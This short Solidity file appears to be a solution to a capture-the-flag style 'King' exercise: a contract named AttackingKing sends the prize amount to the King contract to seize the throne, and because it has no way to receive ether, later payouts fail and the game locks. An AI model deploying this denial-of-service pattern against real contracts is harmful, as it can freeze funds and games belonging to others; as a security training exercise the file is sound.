// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;
    King public kingContract;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        kingContract = King(_contractAddress);
    }

    function hackContract() external payable{
        // Code me!
        address(kingContract).call{value: kingContract.prize()}(""); // triggering the receive() function on King contract with the msg.value as prize

    }
}
